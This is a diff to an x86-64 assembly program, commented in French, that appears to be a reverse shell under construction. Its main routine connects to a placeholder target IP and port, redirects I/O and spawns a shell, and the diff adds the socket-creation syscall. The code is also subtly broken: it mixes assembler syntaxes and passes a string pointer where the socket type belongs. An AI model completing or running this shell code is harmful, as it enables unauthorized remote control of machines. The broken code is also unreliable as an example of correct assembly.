@@ -3,6 +3,15 @@
     TARGET_IP ;ip
     TARGET_PORT ;port
 
+    ;============================
+    ; Socket section
+    ;============================
+    SYSCALL_SOCKET: .int 41
+    sockaddr_ptr: .string ""
+    AF_INET: .int 2
+    IP_PROTOCOL: .int 0
+    ;============================
+
 .section .text
     global _start
 
@@ -17,7 +26,7 @@ _start:
 ; ----------------------------------
 main:
 
-    call create_soket
+    call create_socket
     call connect
     call redir_io
     call shell
@@ -26,8 +35,12 @@ main:
 ; ----------------------------------
 ; Création de la socket 
 ; ----------------------------------
-create_soket:
-
+create_socket:
+    mov rax, SYSCALL_SOCKET
+    mov rdi, AF_INET
+    mov rsi, sockaddr_ptr   ; Adresse de la cible
+    mov rdx, IP_PROTOCOL
+    syscall
 ; ----------------------------------
 ; Connexion à la cible 
 ; ----------------------------------
